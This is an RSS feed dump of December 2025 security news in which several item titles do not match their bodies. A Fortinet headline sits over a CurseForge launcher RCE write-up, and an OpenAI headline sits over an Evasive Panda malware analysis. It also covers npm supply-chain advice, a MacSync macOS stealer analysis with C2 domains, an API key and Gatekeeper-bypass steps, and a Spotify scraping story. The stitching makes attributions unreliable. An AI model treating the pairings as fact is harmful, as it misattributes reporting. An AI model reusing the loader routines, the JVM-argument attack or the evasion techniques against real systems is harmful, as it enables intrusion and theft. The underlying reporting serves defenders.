In Q3 2025, the percentage of ICS computers on which spyware and ransomware were blocked increased. The rates were:spyware: 4.04% (up 0.20 pp);ransomware: 0.17% (up 0.03 pp).The percentage of ICS computers on which miners of both categories were blocked decreased. The rates were:miners in the form of executable files for Windows: 0.57% (down 0.06 pp), it’s the lowest level since Q3 2022;web miners: 0.25% (down 0.05 pp). This is the lowest level since Q3 2022.Self-propagating malware (worms and viruses) is a category unto itself. Worms and virus-infected files were originally used for initial infection, but as botnet functionality evolved, they took on next-stage characteristics.To spread across ICS networks, viruses and worms rely on removable media and network folders in the form of infected files, such as archives with backups, office documents, pirated games and hacked applications. In rarer and more dangerous cases, web pages with network equipment settings, as well as files stored in internal document management systems, product lifecycle management (PLM) systems, resource management (ERP) systems and other web services are infected.In Q3 2025, the percentage of ICS computers on which worms and viruses were blocked increased to 1.26% (by 0.04 pp) and 1.40% (by 0.11 pp), respectively.This category of malware can spread in a variety of ways, so it does not belong to a specific group.In Q3 2025, the percentage of ICS computers on which AutoCAD malware was blocked slightly increased to 0.30% (by 0.01 pp).]]></content:encoded></item><item><title>Fortinet Warns of Active Exploitation of FortiOS SSL VPN 2FA Bypass Vulnerability</title><link>https://thehackernews.com/2025/12/fortinet-warns-of-active-exploitation.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiWq72oFKp6biq3Hf_tsdl9xZeVhxI_BGzBaKfw1DiMD2ldey-KGb8qk27HJH9rt-pys9Ga94wnpRZfAYUdFW9g5_-ncNfIBaYtzsHD-GpGk0LtMaSZ0yD83PqptSkQlIuFNwa94qWlQvk3Yqz-eSpFchaeTh3VbYOXgRJ96sDTRz7dy-_ShXQu1jnzQXhx/s1600/fortinet-exploit.jpg" length="" type=""/><pubDate>Thu, 25 Dec 2025 08:22:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Fortinet on Wednesday said it observed "recent abuse" of a five-year-old security flaw in FortiOS SSL VPN in the wild under certain configurations.

Out of curiosity, I started poking around to find other applications on my system that regularly expose local WebSocket servers bound to the loopback interface.I found a handful of interesting apps that will turn into future write-ups pending coordinated disclosure, but the one that stood out immediately was the modding platform CurseForge. CurseForge is one of the most widely used video game modding platforms, with millions of users relying on its desktop launcher to manage and launch modpacks.While monitoring local WebSocket traffic, I noticed that every time a modpack was launched, the CurseForge launcher would send the following message over a local WebSocket connection:At first glance, this looked like a typical launch message. The detail that stood out was that the WebSocket endpoint was bound to localhost, and the message contained no obvious authentication or authorization mechanism, such as API keys, session tokens, or per-request validation.I wrote a small script that re-sent the same WebSocket message, this time with a bogus Origin header set to . To my surprise, the launcher accepted the connection, and the modpack launched successfully.If a random script with a bogus origin header could send WebSocket messages to the CurseForge launcher without restriction, then any website visited by a user could potentially control the launcher as well. From there, I started digging into what was actually hosting this WebSocket server and what else I could do.The server is implemented in  and starts when the launcher opens. I loaded it into JetBrains decompiler, dotPeek, and quickly confirmed that no origin validation was being performed on incoming WebSocket connections.I also started digging into the exposed methods and found several callable actions beyond simply launching a modpack:minecraftGetDefaultLocation - Returns the default Minecraft installation path - Creates a new modpack and returns its GUIDminecraftTaskLaunchInstance - Launches a modpack with a supplied GUID, launcher type, and arbitrary Java argumentsThere are many other methods for other games and launcher features, but the above are the most relevant for this write-up.The biggest concern here is minecraftTaskLaunchInstance, as it allows attacker-controlled JVM arguments to be supplied via the  field when launching the game.To see how far this could go, I wrote a simple proof-of-concept. CurseForge supports several other games, and I’m fairly confident similar techniques would work there as well, but I’m a die-hard Minecraft fan, so I stuck with the Minecraft-specific methods. The PoC chains together two exposed WebSocket methods: one to create a new modpack, and another to launch it with attacker-controlled JVM arguments.Step 1: Creating a modpackThe first step is calling , which creates a brand-new modpack on the victim’s system and returns a valid GUID that’s required later on for game launch.Step 2: Launching with attacker-controlled JVM argumentsOnce that GUID comes back, it gets fed directly into a minecraftTaskLaunchInstance call. This is where things get fun, since the launcher happily accepts arbitrary JVM arguments via .For the demo, I used the following JVM flags to achieve code execution:By forcing the metaspace to an unrealistically small size with the first flag, the JVM quickly runs out of memory during startup. The second flag handles that memory error and executes an arbitrary command when the JVM crashes. In this case, it simply opens the classic calc.exe.The malicious JVM arguments and GUID are then passed into the following launch payload:When this message is sent, CurseForge launches the newly created modpack with the supplied JVM arguments, causing the payload to execute on the client system as the game starts. Depending on the user’s launcher settings, this may require minimal user interaction, but in many cases it occurs automatically.The included video PoC makes every step visible for demonstration. In a real-world attack, the same exploit could be executed entirely in the background by a malicious website.The only real wrinkle in this proof of concept is that CurseAgent does not bind its WebSocket server to a fixed port. Instead, it listens on a randomly assigned local port each time the launcher starts.To address that, the PoC first needs to determine which port the WebSocket server is actually listening on. This is done by probing the local port range and attempting to open WebSocket connections until a valid CurseForge endpoint responds. Once the correct port is found, the rest of the exploit chain proceeds normally.The scan touches roughly 16,000 ports and works reliably in Chromium-based browsers, which handle the connection attempts without many issues, aside from some lag on lower-end systems. Firefox, on the other hand, crashes almost immediately, making the PoC largely unusable there.Needless to say, this issue was reported to CurseForge shortly after discovery. - Vulnerability discovered and initially reported. - Follow-up communication with CurseForge. Due to the absence of a security contact, coordination was handled through an amazing community manager who escalated it internally. - Vulnerability formally acknowledged. - Received a CurseForge t-shirt. - Fix released in the CurseForge app version 1.289.3, with origin checking added after follow-ups. - Public disclosure after allowing time for rollout.From initial report to fix, this left an exploitable RCE reachable from the browser for a little over three months.To their credit, the CurseForge team ultimately addressed the issue, and the launcher no longer exposes this WebSocket server. The disclosure timeline was longer than I would have liked, given the impact, but I appreciate that it was eventually resolved.Also, shoutout to CurseForge for the t-shirt!]]></content:encoded></item><item><title>OpenAI is reportedly testing Claude-like Skills for ChatGPT</title><link>https://www.bleepingcomputer.com/news/artificial-intelligence/openai-is-reportedly-testing-claude-like-skills-for-chatgpt/</link><author>Mayank Parmar</author><category>security</category><pubDate>Wed, 24 Dec 2025 22:31:28 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[OpenAI is testing a new ChatGPT feature called "Skills," which will be similar to Claude's feature, also called Skills.

Our latest research (June 2025) reveals that the attackers conducted highly-targeted campaigns, which started in November 2022 and ran until November 2024.The group mainly performed adversary-in-the-middle (AitM) attacks on specific victims. These included techniques such as dropping loaders into specific locations and storing encrypted parts of the malware on attacker-controlled servers, which were resolved as a response to specific website DNS requests. Notably, the attackers have developed a new loader that evades detection when infecting its targets, and even employed hybrid encryption practices to complicate analysis and make implants unique to each victim.Furthermore, the group has developed an injector that allows them to execute their MgBot implant in memory by injecting it into legitimate processes. It resides in the memory space of a decade-old signed executable by using DLL sideloading and enables them to maintain a stealthy presence in compromised systems for extended periods.The threat actor commonly uses lures that are disguised as new updates to known third-party applications or popular system applications trusted by hundreds of users over the years.In this campaign, the attackers used an executable disguised as an update package for SohuVA, which is a streaming app developed by Sohu Inc., a Chinese internet company. The malicious package, named sohuva_update_10.2.29.1-lup-s-tp.exe, clearly impersonates a real SohuVA update to deliver malware from the following resource, as indicated by our telemetry:http://p2p.hd.sohu.com[.]cn/foxd/gz?file=sohunewplayer_7.0.22.1_03_29_13_13_union.exe&new=/66/157/ovztb0wktdmakeszwh2eha.exeThere is a possibility that the attackers used a DNS poisoning attack to alter the DNS response of  to an attacker-controlled server’s IP address, while the genuine update module of the SohuVA application tries to update its binaries located in appdata\roaming\shapp\7.0.18.0\package. Although we were unable to verify this at the time of analysis, we can make an educated guess, given that it is still unknown what triggered the update mechanism.Furthermore, our analysis of the infection process has identified several additional campaigns pursued by the same group. For example, they utilized a fake updater for the iQIYI Video application, a popular platform for streaming Asian media content similar to SohuVA. This fake updater was dropped into the application’s installation folder and executed by the legitimate service . Upon execution, the fake updater initiated malicious activity on the victim’s system, and we have identified that the same method is used for IObit Smart Defrag and Tencent QQ applications.The initial loader was developed in C++ using the Windows Template Library (WTL). Its code bears a strong resemblance to Wizard97Test, a WTL sample application hosted on Microsoft’s GitHub. The attackers appear to have embedded malicious code within this project to effectively conceal their malicious intentions.The loader first decrypts the encrypted configuration buffer by employing an XOR-based decryption algorithm:for ( index = 0; index < v6; index = (index + 1) )
{
if ( index >= 5156 )
break;
mw_configindex ^= (&mw_deflated_config + (index & 3));
}
After decryption, it decompresses the LZMA-compressed buffer into the allocated buffer, and all of the configuration is exposed, including several components:Malware installation path: %ProgramData%\Microsoft\MFResource domain: http://www.dictionary.com/Resource URI: image?id=115832434703699686&product=dict-homepage.pngMgBot encrypted configurationThe malware also checks the name of the logged-in user in the system and performs actions accordingly. If the username is , the malware copies itself with a different name by appending the  suffix inside the current working directory. Then it uses the ShellExecuteW API to execute the newly created version. Notably, all relevant strings in the malware, such as  and , are encrypted, and the loader decrypts them with a specific XOR algorithm.Decryption routine of encrypted stringsIf the username is not , the malware first copies  into %TEMP%, naming the instance as  (where  is an incremented decimal number), and then deletes the original file. The purpose of this activity is unclear, but it consumes high system resources. Next, the loader decrypts the  and  strings to retrieve their base addresses by calling the GetProcAddress API. Afterwards, it uses a single-byte XOR key to decrypt the shellcode, which is 9556 bytes long, and stores it at the same address in the  section. Since the  section does not have execute permission, the malware uses the VirtualProtect API to set the permission for the section. This allows for the decrypted shellcode to be executed without alerting security products by allocating new memory blocks. Before executing the shellcode, the malware prepares a 16-byte-long parameter structure that contains several items, with the most important one being the address of the encrypted MgBot configuration buffer.Multi-stage shellcode executionAs mentioned above, the loader follows a unique delivery scheme, which includes at least two stages of payload. The shellcode employs a hashing algorithm known as PJW to resolve Windows APIs at runtime in a stealthy manner.unsigned int calc_PJWHash(_BYTE *a1)
{
unsigned int v2;
v2 = 0;
while ( *a1 )
{
v2 = *a1++ + 16 * v2;
if ( (v2 & 0xF0000000) != 0 )
v2 = ~(v2 & 0xF0000000) & (v2 ^ ((v2 & 0xF0000000) >> 24));
}
return v2;
}
The shellcode first searches for a specific DAT file in the malware’s primary installation directory. If it is found, the shellcode decrypts it using the CryptUnprotectData API, a Windows API that decrypts protected data into allocated heap memory, and ensures that the data can only be decrypted on the particular machine by design. After decryption, the shellcode deletes the file to avoid leaving any traces of the valuable part of the attack chain.If, however, the DAT file is not present, the shellcode initiates the next-stage shellcode installation process. It involves retrieving encrypted data from a web source that is actually an attacker-controlled server, by employing a DNS poisoning attack. Our telemetry shows that the attackers successfully obtained the encrypted second-stage shellcode, disguised as a PNG file, from the legitimate website . However, upon further investigation, it was discovered that the IP address associated with  had been manipulated through a DNS poisoning technique. As a result, victims’ systems were resolving the website to different attacker-controlled IP addresses depending on the victims’ geographical location and internet service provider.To retrieve the second-stage shellcode, the first-stage shellcode uses the RtlGetVersion API to obtain the current Windows version number and then appends a predefined string to the HTTP header:sec-ch-ua-platform: windows %d.%d.%d.%d.%d.%d
This implies that the attackers needed to be able to examine request headers and respond accordingly. We suspect that the attackers’ collection of the Windows version number and its inclusion in the request headers served a specific purpose, likely allowing them to target specific operating system versions and even tailor their payload to different operating systems. Given that the Evasive Panda threat actor has been known to use distinct implants for Windows (MgBot) and macOS (Macma) in previous campaigns, it is likely that the malware uses the retrieved OS version string to determine which implant to deploy. This enables the threat actor to adapt their attack to the victim’s specific operating system by assessing results on the server side.Downloading a payload from the web resourceFrom this point on, the first-stage shellcode proceeds to decrypt the retrieved payload with a XOR decryption algorithm:key = *(mw_decryptedDataFromDatFile + 92);
index = 0;
if ( sz_shellcode )
{
mw_decryptedDataFromDatFile_1 = Heap;
do
{
*(index + mw_decryptedDataFromDatFile_1) ^= *(&key + (index & 3));
++index;
}
while ( index < sz_shellcode );
}
The shellcode uses a 4-byte XOR key, consistent with the one used in previous stages, to decrypt the new shellcode stored in the DAT file. It then creates a structure for the decrypted second-stage shellcode, similar to the first stage, including a partially decrypted configuration buffer and other relevant details.Next, the shellcode resolves the VirtualProtect API to change the protection flag of the new shellcode buffer, allowing it to be executed with  permissions. The second-stage shellcode is then executed, with the structure passed as an argument. After the shellcode has finished running, its return value is checked to see if it matches . Depending on the outcome, the shellcode will either terminate its own process or return control to the caller.Although we were unable to retrieve the second-stage payload from the attackers’ web server during our analysis, we were able to capture and examine the next stage of the malware, which was to be executed afterwards. Our analysis suggests that the attackers may have used the CryptProtectData API during the execution of the second shellcode to encrypt the entire shellcode and store it as a DAT file in the malware’s main installation directory. This implies that the malware writes an encrypted DAT file to disk using the CryptProtectData API, which can then be decrypted and executed by the first-stage shellcode. Furthermore, it appears that the attacker attempted to generate a unique encrypted second shellcode file for each victim, which we believe is another technique used to evade detection and defense mechanisms in the attack chain.We identified a secondary loader, named , which was disguised as a legitimate Windows library and used by the Evasive Panda group to achieve a stealthier loading mechanism. Notably, this malicious DLL loader relies on a legitimate, signed executable named  (MD5: 1c36452c2dad8da95d460bee3bea365e), which is an older version of . This executable is a Python wrapper that normally imports the  library and calls the  function.The secondary loader retrieves the full path of the current module () and writes it to a file named , located in C:\ProgramData\Microsoft\eHome, but only if a file with the same name does not already exist in that directory. We believe with a low-to-medium level of confidence that this action is intended to allow the attacker to potentially update the secondary loader in the future. This suggests that the attacker may be planning for future modifications or upgrades to the malware.The malware proceeds to decrypt the next stage by reading the entire contents of C:\ProgramData\Microsoft\eHome\perf.dat. This file contains the previously downloaded and XOR-decrypted data from the attacker-controlled server, which was obtained through the DNS poisoning technique as described above. Notably, the implant downloads the payload several times and moves it between folders by renaming it. It appears that the attacker used a complex process to obtain this stage from a resource, where it was initially XOR-encrypted. The attacker then decrypted this stage with XOR and subsequently encrypted and saved it to  using a custom hybrid of Microsoft’s Data Protection Application Programming Interface (DPAPI) and the RC5 algorithm.General overview of storing payload on disk by using hybrid encryptionThis custom encryption algorithm works as follows. The RC5 encryption key is itself encrypted using Microsoft’s DPAPI and stored in the first 16 bytes of . The RC5-encrypted payload is then appended to the file, following the encrypted key. To decrypt the payload, the process is reversed: the encrypted RC5 key is first decrypted with DPAPI, and then used to decrypt the remaining contents of , which contains the next-stage payload.The attacker uses this approach to ensure that a crucial part of the attack chain is secured, and the encrypted data can only be decrypted on the specific system where the encryption was initially performed. This is because the DPAPI functions used to secure the RC5 key tie the decryption process to the individual system, making it difficult for the encrypted data to be accessed or decrypted elsewhere. This makes it more challenging for defenders to intercept and analyze the malicious payload.After completing the decryption process, the secondary loader initiates the runtime injection method, which likely involves the use of a custom runtime DLL injector for the decrypted data. The injector first calls the DLL entry point and then searches for a specific export function named . Although we were unable to determine which encrypted module was decrypted and executed in memory due to a lack of available data on the attacker-controlled server, our telemetry reveals that an MgBot variant is injected into the legitimate  process after the secondary loader is executed. Fortunately, this allowed us to analyze these implants further and gain additional insights into the attack, as well as reveal that the encrypted initial configuration was passed through the infection chain, ultimately leading to the execution of MgBot. The configuration file was decrypted with a single-byte XOR key, , and this would lead to the full exposure of the configuration.Our analysis suggests that the configuration includes a campaign name, hardcoded C2 server IP addresses, and unknown bytes that may serve as encryption or decryption keys, although our confidence in this assessment is limited. Interestingly, some of the C2 server addresses have been in use for multiple years, indicating a potential long-term operation.Decryption of the configuration in the injected MgBot implantOur telemetry has detected victims in Türkiye, China, and India, with some systems remaining compromised for over a year. The attackers have shown remarkable persistence, sustaining the campaign for two years (from November 2022 to November 2024) according to our telemetry, which indicates a substantial investment of resources and dedication to the operation.The techniques, tactics, and procedures (TTPs) employed in this compromise indicate with high confidence that the Evasive Panda threat actor is responsible for the attack. Despite the development of a new loader, which has been added to their arsenal, the decade-old MgBot implant was still identified in the final stage of the attack with new elements in its configuration. Consistent with previous research conducted by several vendors in the industry, the Evasive Panda threat actor is known to commonly utilize various techniques, such as supply-chain compromise, Adversary-in-the-Middle attacks, and watering-hole attacks, which enable them to distribute their payloads without raising suspicion.The Evasive Panda threat actor has once again showcased its advanced capabilities, evading security measures with new techniques and tools while maintaining long-term persistence in targeted systems. Our investigation suggests that the attackers are continually improving their tactics, and it is likely that other ongoing campaigns exist. The introduction of new loaders may precede further updates to their arsenal.As for the AitM attack, we do not have any reliable sources on how the threat actor delivers the initial loader, and the process of poisoning DNS responses for legitimate websites, such as , is still unknown. However, we are considering two possible scenarios based on prior research and the characteristics of the threat actor: either the ISPs used by the victims were selectively targeted, and some kind of network implant was installed on edge devices, or one of the network devices of the victims — most likely a router or firewall appliance — was targeted for this purpose. However, it is difficult to make a precise statement, as this campaign requires further attention in terms of forensic investigation, both on the ISPs and the victims.The configuration file’s numerous C2 server IP addresses indicate a deliberate effort to maintain control over infected systems running the MgBot implant. By using multiple C2 servers, the attacker aims to ensure prolonged persistence and prevents loss of control over compromised systems, suggesting a strategic approach to sustaining their operations.

The most recent example is the multi-wave Shai-Hulud campaign.

While individual incidents differ in their mechanics and speed, the pattern is consistent: Adversaries learn quickly, target maintainer workflows, and exploit trust boundaries in publication pipelines.

This post distills durable lessons and actions to help maintainers and organizations harden their systems and prepare for the next campaign, not just respond to the last one. We also share more about what’s next on the npm security roadmap over the next two quarters.

## Recent Shai-Hulud Campaigns

Shai-Hulud is a coordinated, multi-wave campaign targeting the JavaScript supply chain and evolved from opportunistic compromises to engineered, targeted attacks.

The first wave focused on abusing compromised maintainer accounts. It injected malicious post install scripts to slip malicious code into packages, exfiltrate secrets, and self-replicate, demonstrating how quickly a single foothold can ripple across dependencies.

The second wave, referred to as Shai-Hulud 2.0, escalated the threat: Its ability to self-replicate and spread via compromised credentials was updated to enable cross-victim credential exposure. The second wave also introduced endpoint command and control via self-hosted runner registration, harvesting a wider range of secrets to fuel further propagation, and destructive functionality. This wave added a focus on CI environments, changing its behavior when it detects it is running in this context and including privilege escalation techniques targeted to certain build agents. It also used a multi-stage payload that was harder to detect than the previous wave payload. The shortened timeline between variants signals an organized adversary studying community defenses and rapidly iterating around them.

Rather than isolated breaches, the Shai-Hulud campaigns target trust boundaries in maintainer workflows and CI publication pipelines, with a focus on credential harvesting and install-time execution. The defining characteristics we see across waves include:

- **Credential-adjacent compromise:** Attackers gain initial footholds via compromised credentials or OAuth tokens, then pivot to collect additional secrets (npm tokens, CI tokens, cloud credentials) to expand reach. This enables reuse across organizations and future waves without a single point of failure.
- **Install-time execution with obfuscation:** Malicious post-install or lifecycle scripts are injected into packages (or dependency chains) and only reveal behavior at runtime. Payloads are often conditionally activated (e.g., environment checks, org scopes) and exfiltrate data using techniques tailored to the environment it is running in.
- **Targeting trusted namespaces and internal package names:** The campaign affected popular and trusted packages, and the worm published infected packages with existing package names. The second wave also patched the version number of the package to make the infected packages look like legitimate updates and blend in with normal maintainer activity.
- **Rapid iteration and engineering around defenses:** Short intervals between variants and deliberate changes to bypass previous mitigations indicate an organized campaign mindset. The goal is durable access and scalable spread, not one-off opportunism.
- **Review blind spots in publication pipelines:** Differences between source and published artifacts, lifecycle scripts, and build-time transformations create gaps where injected behavior can land without notice if teams lack artifact validation or staged approvals.

Recent waves in this pattern reinforce that defenders should harden publication models and credential flows proactively, rather than tailoring mitigations to any single variant.

## What’s Next for npm

We’re accelerating our security roadmap to address the evolving threat landscape. Moving forward, our immediate focus is on adding support for:

- **Bulk OIDC onboarding**: Streamlined tooling to help organizations migrate hundreds of packages to trusted publishing at scale.
- **Expanded OIDC provider support**: Adding support for additional CI providers beyond GitHub Actions and GitLab.
- **Staged publishing**: A new publication model that gives maintainers a review period before packages go live, with MFA-verified approval from package owners. This empowers teams to catch unintended changes before they reach downstream users—a capability the community has been requesting for years.

Together, these investments give maintainers stronger, more flexible tools to secure their packages at every stage of the publication process.

## Advice for GitHub and npm users and maintainers

Malware like Shai-Hulud often spreads by adding malicious code to npm packages. The malicious code is executed as part of the installation of the package so that any npm user who installs the package is compromised. The malware scavenges the local system for tokens, which it can then use to continue propagating. Since npm packages often have many dependencies, by adding malware to one package, the attacker can indirectly infect many other packages. And by hoarding some of the scavenged tokens rather than using them immediately, the attacker can launch a new campaign weeks or months after the initial compromise.

In the “References” section below, we have included links to longer articles with analysis of recent campaigns and advice on how to stay secure, so we won’t rehash all of that information here. Instead, here is a short summary of our top recommendations:

### Advice for everyone

- Enable phishing-resistant MFA on all your accounts, particularly for GitHub package managers like npm, PyPI, RubyGems, or NuGet, and also any accounts that could be leveraged for account takeover or phishing, like email and social media accounts.
- Always set an expiration date on tokens to ensure that they’re rotated on a regular schedule. Organizations can enforce a maximum lifetime policy.
- Audit and revoke access for unused GitHub/OAuth apps.
- Use a sandbox, such as GitHub Codespaces or a virtual machine or container, for development work. This limits the access of any malware that you accidentally run.

### Advice for maintainers

- Enable branch protection so that malicious updates cannot be pushed directly to your main branch, even if the attacker has access to a valid token.
- Use npm trusted publishing instead of tokens. Trusted publishing is also available for other package managers such as PyPI, RubyGems, and NuGet.
- Pin CI dependencies, enable code scanning, and don’t forget to _resolve_ the code scanning alerts!
- Monitor package artifacts and validate published tarballs/bundles against source (e.g., SRI or artifact build attestations).

Note that the above advice is preventative. If you believe you are a victim of an attack and need help securing your GitHub or npm account, please contact GitHub Support.

What initially appeared to be a straightforward Swift downloader revealed itself to be a well-engineered three-stage attack chain with some interesting anti-analysis and evasion techniques.Concurrent analysis by Jamf Threat Labs has confirmed this sample is a variant of , a macOS infostealer operating under the Malware-as-a-Service (MaaS) model. The threat actor operates under the alias “mentalpositive” on underground forums. Apple has since revoked the developer certificate (Team ID ).The sample, which I’m calling UserSyncWorker based on its internal naming, operates through a carefully orchestrated infection chain. The first stage is a Swift-based Mach-O binary that functions as a downloader, pulling a Zsh wrapper script from its primary C2 at . That wrapper contains a Base64 and Gzip encoded payload which, when decoded, communicates with a secondary C2 at  to retrieve AppleScript commands and exfiltrate harvested data.What makes this sample notable is its defense evasion. The downloader programmatically strips the  extended attribute before executing downloaded payloads, bypassing Gatekeeper. Rate limiting logic prevents rapid re-execution, likely to frustrate sandbox analysis. Code signature validation ensures only payloads signed with a specific TeamIdentifier execute. These are not commodity malware techniques.The final stage retrieves AppleScript dynamically via HTTP and pipes it directly to  for execution. Collected data ends up archived at  before exfiltration. That “osalogging” naming convention is a strong indicator of keystroke logging or credential harvesting functionality.Let us walk through the analysis.malware (original name unknown)Mach-O 64-bit x86-64 executable06c74829d8eee3c47e17d01c41361d314f12277d899cc9dfa789fe767c03693eaa3804744ef482e6c509a77511f98667Not recovered (Swift binary)OSX.MacSync.B (MacSync Stealer)Before diving into the technical details, here is how the full infection chain operates:The stages unfold as follows:: Creates ~/Library/Application Support/UserSyncWorker/ for state persistence and ~/Library/Logs/UserSyncWorker.log for activity logging.: Issues an HTTP request to  using a dispatch semaphore for synchronous execution. Classic “am I online” check.: Reads  to determine if sufficient time has elapsed since previous execution. This prevents rapid re-execution and likely evades automated sandbox analysis that only observes short execution windows.: Downloads Stage 2 from  using curl with enforced TLS 1.2 minimum. ETag headers are cached to  for conditional GET requests, reducing network noise.: Validates the payload’s code signature using  and . Only payloads signed with TeamIdentifier  proceed. This is interesting operational security.: Removes the  extended attribute from the payload, bypassing Gatekeeper enforcement.: The Zsh script is executed via NSTask. It decodes an embedded Base64+Gzip payload into memory and executes it via , leaving no disk artifacts.: Redirects file descriptors to , then contacts focusgroovy[.]com/dynamic to retrieve AppleScript commands.: Retrieved AppleScript is piped directly to  for execution without touching disk.: Uploads  to  via HTTP POST multipart form, then deletes the archive.The most interesting technique in this sample is the programmatic Gatekeeper bypass. Here is what happens:macOS applies the  extended attribute to files downloaded from the internet. This is the “quarantine flag” that triggers Gatekeeper to verify code signatures and potentially block unsigned or maliciously signed executables. Users see the familiar “This application was downloaded from the Internet” dialog.UserSyncWorker bypasses this entirely. The downloader invokes  (or equivalent API) to strip the quarantine attribute before executing the downloaded payload:It then calls spctl --assess --type execute to verify the bypass succeeded—this command returns exit code 0 for allowed applications and non-zero for rejected ones. This technique allows execution of payloads that would otherwise trigger Gatekeeper warnings or blocks.The catch: this bypass requires the downloader itself to already be running with appropriate permissions. The initial infection vector likely involved user interaction or exploitation of a trusted application context. The downloader cannot bypass Gatekeeper for itself, only for subsequently downloaded payloads.Code Signature Validation#The downloader validates downloaded payloads using  and extracts the TeamIdentifier from the output. Execution proceeds only if the TeamIdentifier matches .Note: The  redirect is required because  outputs signature details to stderr, not stdout.This serves dual purposes:: Prevents execution of tampered or substituted payloads. If a researcher swaps out the payload, it will not run.: The operators possess a valid Apple Developer certificate, either legitimately obtained, stolen, or purchased. This is not commodity malware behaviour.As noted in the Threat Intelligence section, Apple has since revoked this certificate.Stage 2 employs multiple obfuscation layers that make static analysis painful:The outer Zsh script uses a randomised variable name (observed: ) and randomised heredoc delimiter (observed: ). The inner payload is compressed with Gzip and encoded with Base64.The  execution model prevents the decoded script from touching disk. Only memory forensics or network capture would reveal the final payload in a live infection. This is exactly the kind of in-memory execution that makes incident response more challenging.The C2 infrastructure uses two separate domains with different protocols:Stage 1 to gatemaden[.]space (HTTPS):TLS 1.2 minimum enforced via --proto '=https' --tlsv1.2 --tls-max 1.3Custom User-Agent: UserSyncWorker/1.0 (macOS)ETag caching for conditional requestsStage 3 to focusgroovy[.]com (HTTP):Unencrypted HTTP (interesting choice)Chrome User-Agent masquerading: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36...API key header for authentication: api-key: 5190ef1733183a0dc63fb623357f56d6The shift from HTTPS to HTTP between stages is notable. It may indicate infrastructure limitations, different operators for each stage, or intentional design. HTTP reduces TLS inspection visibility on the exfiltration channel, though at the cost of enabling network monitoring to observe the traffic content.Data Collection and Exfiltration#The final stage uploads  to the C2 server. The “osalogging” name strongly suggests the dynamically retrieved AppleScript performs one or more of:Keystroke logging via macOS accessibility APIsCredential harvesting from KeychainThe exfiltration request includes the campaign token as the  form field, enabling the operators to correlate uploads with specific victims or campaigns:After successful upload, the script deletes  to cover its tracks.Command and Scripting Interpreter: AppleScriptStage 3 pipes C2 response to osascriptCommand and Scripting Interpreter: Unix ShellStage 2 Zsh wrapper; Stage 3 Zsh executionNSTask for process spawningSubvert Trust Controls: Gatekeeper BypassRemoval of com.apple.quarantine attributeObfuscated Files or InformationBase64+Gzip payload encodingDeobfuscate/Decode Files or InformationRuntime decoding via base64 -D and gunzipMasquerading: Match Legitimate Name or LocationChrome User-Agent in Stage 3 requestsIndicator Removal: File DeletionDeletion of osalogging.zip after exfiltrationVirtualization/Sandbox Evasion: Time Based EvasionRate limiting between executionsApplication Layer Protocol: Web ProtocolsHTTP/HTTPS C2 communicationPayload download from gatemaden.spaceExfiltration Over C2 ChannelHTTP POST to /gate endpointThreat Intelligence and Attribution#Open source intelligence research has positively identified this sample as a variant of , a macOS infostealer operating under the Malware-as-a-Service (MaaS) model.

The variant analysed here represents the third generation of distribution methodology:This sample demonstrates a clear trend toward reducing user interaction requirements while increasing perceived legitimacy through code signing and notarization.Apple has  the certificate associated with Developer Team ID  following Jamf’s disclosure. Systems with updated XProtect signatures should now block execution of this specific dropper variant. However, this does not preclude the threat actor from obtaining new developer credentials.MacSync competes directly with AMOS (Atomic macOS Stealer) in the MaaS market, the dominant macOS stealer family with tens of thousands of detections in 2025. Both families use AppleScript-based credential harvesting and HTTP POST exfiltration to similar endpoint structures. for  and  at enterprise DNS resolvers and perimeter firewalls. for the User-Agent string UserSyncWorker/1.0 (macOS) in HTTP proxy logs and network monitoring systems.Monitor endpoint telemetry for creation of ~/Library/Application Support/UserSyncWorker/ or  file paths.Alert on quarantine stripping: Processes invoking  to remove  followed by execution of the modified file.Verify XProtect is current: Apple has revoked the certificate for TeamIdentifier . Ensure endpoints have updated XProtect definitions.: Look for curl processes with the header value 5190ef1733183a0dc63fb623357f56d6 in command-line logging.This sample is confirmed as a variant of MacSync Stealer with high confidence based on exact matches across Developer Team ID, C2 infrastructure, payload paths, obfuscation methods, and binary hash.

We saw a role for us here to build a music archive primarily aimed at preservation.”Spotify insists that the hacktivists obtained no user data. Still, the incident highlights how large‑scale scraping, digital rights management (DRM) circumvention, and weak abuse controls can turn major content platforms into high‑value targets.Anna’s Archive claims it obtained metadata for around 256 million tracks and audio files for roughly 86 million songs, totaling close to 300 TB. Reportedly, this represents about 99.9% of Spotify’s catalog and roughly 99.6% of all streams.Spotify says it has “identified and disabled the nefarious user accounts that engaged in unlawful scraping” and implemented new safeguards.From a security perspective, this incident is a textbook example of how scraping can escalate beyond “just metadata” into industrial‑scale content theft. By combining public APIs, token abuse, rate‑limit evasion, and DRM bypass techniques, attackers can extract protected content at scale. If you can create or compromise enough accounts and make them appear legitimate, you can chip away at content protections over time.The “Spotify scrape” will likely be framed as a copyright story. But from a security angle, it serves as a reminder: if a platform exposes content or metadata at scale, someone will eventually automate access to it, weaponize it, and redistribute it.And hiding behind violations of terms and conditions—which have never stopped criminals—is not effective security control.How does this affect you?There is currently no indication that passwords, payment details, or private playlists were exposed. This incident is purely about content and metadata, not user databases. That said, scammers may still claim otherwise. Be cautious of messages alleging your account data was compromised and asking for your login details.Some general Spotify security tips, to be on the safe side:If you have reused your Spotify password elsewhere or shared your credentials, consider changing your password for peace of mind.Regularly review active sessions on streaming services and revoke anything you do not recognize. Spotify does not offer per-device session management, but you can sign out of all devices via Account > Settings and privacy on the Spotify website.Avoid unofficial downloaders, converters, or “Spotify mods” that ask for your login or broad OAuth permissions. These tools often rely on the same kind of scraping infrastructure—or worse, function as credential-stealing malware.We don’t just report on threats – we help protect your social media]]></content:encoded></item><item><title>Cyberattack knocks offline France&apos;s postal, banking services</title><link>https://www.bleepingcomputer.com/news/security/cyberattack-knocks-offline-frances-postal-banking-services/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 23 Dec 2025 12:26:44 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The French national postal service's online services were knocked offline by "a major network incident" on Monday, disrupting digital banking and other services for millions.

